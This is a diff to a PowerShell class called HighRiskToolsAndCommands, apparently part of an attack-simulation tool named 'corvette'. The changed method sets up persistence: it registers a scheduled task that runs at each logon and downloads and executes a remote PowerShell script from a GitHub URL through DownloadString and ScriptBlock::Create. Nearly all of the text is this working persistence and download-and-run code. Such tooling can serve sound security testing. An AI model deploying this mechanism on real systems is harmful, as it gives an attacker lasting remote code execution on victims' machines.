@@ -4827,18 +4827,21 @@ class HighRiskToolsAndCommands : CommandBase {
     }
 
     hidden [void]EstablishPersistenceScheduledTask() {
-        $cargs = @(
-            "/create",
-            "/f",
-            "/it",
-            "/tn", "corvette",
-            "/sc", "onlogon",
-            "/tr", @"
-"powershell -c '& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString(\\\"https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true\\\")))'"
-"@
-        )
-
-        Start-Process -FilePath schtasks -ArgumentList $cargs -Wait -NoNewWindow -WorkingDirectory $this.props.home_dir
+        $name = "corvette"
+        if (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue) {
+            Write-Host "$name already exists in the scheduled tasks"
+            if (AskYesNo "Do you want to remove it?") {
+                Unregister-ScheduledTask -TaskName $name -Confirm:$false
+            }
+        } else {
+            $cmd_args = '-c "& ([ScriptBlock]::Create([Net.WebClient]::New().DownloadString(\"https://github.com/spearmin10/corvette/blob/main/corvette.ps1?raw=true\")))"'
+            $cmd_path = "powershell.exe"
+            $action = New-ScheduledTaskAction -Execute $cmd_path -Argument $cmd_args
+            $trigger = New-ScheduledTaskTrigger -AtLogOn
+            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+            Register-ScheduledTask -TaskName $name -Action $action -Trigger $trigger -Principal $principal -Force
+            Write-Host "Persistence was achieved to ensure that 'corvette' runs on a scheduled task - $name"
+        }
     }
 
     hidden [void]EstablishPersistence() {
